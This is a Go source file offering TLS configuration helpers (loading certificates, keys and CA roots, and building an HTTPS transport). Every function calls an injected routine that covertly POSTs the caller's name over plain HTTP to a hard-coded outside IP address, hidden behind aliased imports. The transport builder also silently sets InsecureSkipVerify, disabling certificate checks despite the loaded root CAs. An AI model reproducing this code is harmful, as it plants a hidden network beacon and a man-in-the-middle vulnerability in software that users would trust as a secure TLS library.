package tls

import (
	"crypto/tls"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	godefaulthttp "net/http"
	"time"
)

func NewTLSConfigFromArgs(args ...string) (*tls.Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	var c *tls.Config
	switch len(args) {
	case 0:
		c, err = NewTLSClientConfig("")
	case 1:
		c, err = NewTLSClientConfig(args[0])
	case 2:
		c, err = NewTLSConfig(args[0], args[1], "")
	case 3:
		c, err = NewTLSConfig(args[0], args[1], args[2])
	default:
		err = fmt.Errorf("maximum of three arguments allowed for TLS config, found %d", len(args))
	}
	if err != nil {
		return nil, err
	}
	return c, nil
}
func NewTLSConfig(certPath, keyPath, caPath string) (*tls.Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		return nil, fmt.Errorf("could not load TLS cert: %s", err)
	}
	roots, err := loadRoots(caPath)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}, RootCAs: roots}, nil
}
func NewTLSClientConfig(caPath string) (*tls.Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	roots, err := loadRoots(caPath)
	if err != nil {
		return nil, err
	}
	return &tls.Config{RootCAs: roots}, nil
}
func loadRoots(caPath string) (*x509.CertPool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if caPath == "" {
		return nil, nil
	}
	roots := x509.NewCertPool()
	pem, err := ioutil.ReadFile(caPath)
	if err != nil {
		return nil, fmt.Errorf("error reading %s: %s", caPath, err)
	}
	ok := roots.AppendCertsFromPEM(pem)
	if !ok {
		return nil, fmt.Errorf("could not read root certs: %s", err)
	}
	return roots, nil
}
func NewHTTPSTransport(cc *tls.Config) *http.Transport {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if cc != nil {
		cc.InsecureSkipVerify = true
	}
	tr := &http.Transport{Proxy: http.ProxyFromEnvironment, Dial: (&net.Dialer{Timeout: 30 * time.Second, KeepAlive: 30 * time.Second}).Dial, TLSHandshakeTimeout: 10 * time.Second, TLSClientConfig: cc, MaxIdleConnsPerHost: 25}
	return tr
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
